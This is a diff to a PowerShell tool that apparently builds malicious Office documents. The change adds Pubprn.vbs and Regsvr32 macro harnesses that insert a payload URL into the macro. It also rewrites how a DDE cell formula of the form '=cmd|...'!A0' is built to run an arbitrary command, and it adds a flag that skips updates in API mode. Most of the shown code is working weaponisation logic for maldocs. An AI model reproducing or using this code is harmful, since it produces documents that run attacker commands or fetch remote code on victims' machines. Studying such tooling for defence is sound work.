@@ -1167,15 +1167,18 @@ function Generate-Macro($insertautoopen, $linelength, $ismodify, $doctype)
                         $vbapayload = $null
 						$vbapayload = Get-Harness "PSCellEmbedNonb64" $functionname $i.LegendString
                     }
-					10 { # DDE Attack
-                        # There is no macro code required for this attack.
-                        $vbapayload = Get-Harness "PUBPRN" $functionname $i.LegendString
+					10 { # Pubprn.vbs
+						$vbapayload = Get-Harness "PUBPRN" $functionname $i.LegendString
 						$vbapayload = $vbapayload | %{$_.Replace("|URL|", $payload.PayloadText)}
                     }
 					11 { # DDE Attack
-                        # There is no macro code required for this attack.
-                        $vbapayload = $null
-                    }
+						# There is no macro for this attack.
+						$vbapayload = $null
+					}
+					12 { #Regsrv32
+						$vbapayload = Get-Harness "REGSRV32" $functionname $i.LegendString
+						$vbapayload = $vbapayload | %{$_.Replace("|URL|", $payload.PayloadText)}
+					}
 				}
 
 				if ($i.CustomStrings -ne $null)
@@ -1248,7 +1251,12 @@ function Add-WorksheetPayloads([ref]$Workbook, [ref]$Worksheet, $activeworking, 
                 }
 				11 { #DDE Attack
 					$parts = @()
-                    $parts += "=cmd|'/c $($payload.PayloadText)'!A0"
+					$payloadparts = $payload.PayloadText.Split(" ")
+					$command = $payloadparts[0]
+					$partargs = $payloadparts[1..$payloadparts.Length] | %{$s += $_ + " "}
+					$parts = "=$command|'$($s)'!A0"
+					$legend.StartRow = "1"
+					$legend.StartColumn = "40"
 				}
 				default { # every other infection type embeds a payload that is already b64 encoded
 					$parts = Get-PayloadPartsArray $payload.PayloadText $false
@@ -2518,7 +2526,11 @@ if (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]
 	exit	
 }
 
-Process-Updates
+if (!$API)
+{
+	Process-Updates
+}
+
 Load-Menu 'main'
 
 #endregion 	
